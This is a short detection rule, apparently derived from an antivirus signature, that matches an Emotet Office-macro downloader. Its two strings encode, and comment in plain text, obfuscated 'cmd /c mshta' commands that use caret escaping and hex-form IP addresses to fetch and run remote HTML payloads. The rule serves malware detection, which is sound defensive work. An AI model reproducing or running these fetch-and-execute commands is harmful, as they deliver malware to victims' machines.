
rule TrojanDownloader_O97M_Emotet_AMD_MTB{
	meta:
		description = "TrojanDownloader:O97M/Emotet.AMD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 02 00 00 "
		
	strings :
		$a_01_0 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 30 78 63 31 32 61 32 34 66 35 2f 63 63 2e 68 74 6d 6c } //1 cmd /c m^sh^t^a h^tt^p^:/^/0xc12a24f5/cc.html
		$a_01_1 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 30 78 62 39 30 37 64 36 30 37 2f 63 5e 63 2e 68 5e 74 6d 5e 6c } //1 cmd /c m^sh^t^a h^tt^p^:/^/0xb907d607/c^c.h^tm^l
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=1
 
}